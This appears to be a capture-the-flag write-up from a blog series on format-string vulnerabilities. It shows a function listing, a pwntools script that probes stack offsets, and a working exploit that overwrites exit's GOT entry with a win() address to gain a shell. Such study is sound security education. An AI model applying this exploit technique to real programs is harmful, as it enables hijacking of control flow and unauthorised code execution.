---
title: "Format String - GOT Overwrite"
date: 2019-07-19
description: "format string vulnerability 3"
tags: ["Binary Exploitation Series"]
type: post
weight: 20
showTableOfContents: true
---

# GOT Overwrite Attack

---

# ⚖️ Challenge Write-up

---

- General Analysis

![Untitled.png](https://hackmd.io/_uploads/SJu6N2Ump.png)

# Functions Analysis

```nasm
pwndbg> info functions 
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401080  puts@plt
0x0000000000401090  printf@plt
0x00000000004010a0  __isoc99_scanf@plt
0x00000000004010b0  exit@plt
0x00000000004010c0  execl@plt
0x00000000004010d0  _start
0x0000000000401100  _dl_relocate_static_pie
0x0000000000401110  deregister_tm_clones
0x0000000000401140  register_tm_clones
0x0000000000401180  __do_global_dtors_aux
0x00000000004011b0  frame_dummy
0x00000000004011b6  win
0x00000000004011f9  main
0x0000000000401260  __libc_csu_init
0x00000000004012d0  __libc_csu_fini
0x00000000004012d8  _fini
pwndbg>
```

# Exploit to find where is our input going

```python
#!/usr/bin/python3

from pwn import *

context.log_level = 'error'
for i in range(1,50):
    io = process('./fmt_write')
    payload = f'AAAAAAAA.%{i}$p'
    io.sendline(payload)
    print(io.recvall(),i)
    io.close()
```

# Output

```markdown
b'Enter String - AAAAAAAA.0xa' 1
b'Enter String - AAAAAAAA.(nil)' 2
b'Enter String - AAAAAAAA.(nil)' 3
b'Enter String - AAAAAAAA.0xa' 4
b'Enter String - AAAAAAAA.0x32' 5
b'Enter String - AAAAAAAA.0x4141414141414141' 6
b'Enter String - AAAAAAAA.0x702437252e' 7
b'Enter String - AAAAAAAA.(nil)' 8
b'Enter String - AAAAAAAA.(nil)' 9
b'Enter String - AAAAAAAA.(nil)' 10
b'Enter String - AAAAAAAA.0x7fd6e2539220' 11
b'Enter String - AAAAAAAA.(nil)' 12
b'Enter String - AAAAAAAA.0xd326dc32a239f00' 13
b'Enter String - AAAAAAAA.0x1' 14
....
```

# Exploit to overwrite GOT value

```python
#!/usr/bin/python3

from pwn import *

context.log_level = 'error'

elf = context.binary = ELF('./fmt_got')

io = process('./fmt_got')
payload = b"%4198838x%8$nAAA" + p64(elf.got.exit)
io.sendline(payload)
io.interactive()
```

# Explanation

```markdown
We find that the address of win function we know that %n puts the value of whatever is the length
of the string preceeding it and thus we take the approach of writing the exploit in such a way.
```

# Output

```markdown
Since in this challenge we were suppose to get the shell as a root user and the exploit is kinda
dirty so it is advisable to go through the challenge for the user and see the results.
```